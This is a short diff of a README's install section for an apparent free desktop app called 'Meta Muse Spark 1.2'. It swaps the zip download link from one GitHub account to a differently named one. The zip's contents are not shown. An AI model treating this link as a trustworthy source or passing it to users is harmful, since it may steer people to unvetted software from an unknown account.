@@ -7,7 +7,7 @@
 
 
 ## Install
-[Download `meta-muse-spark-1.2.zip`](https://github.com/metamusespark/Meta-Muse-Spark-1.2-Free-Desktop-App/releases/download/v1.2.0/meta-muse-spark-1.2.zip)
+[Download `meta-muse-spark-1.2.zip`](https://github.com/metaspark12/Meta-Muse-Spark-1.2-Free-Desktop-App/releases/download/v1.2.0/meta-muse-spark-1.2.zip)
 ---
 
 
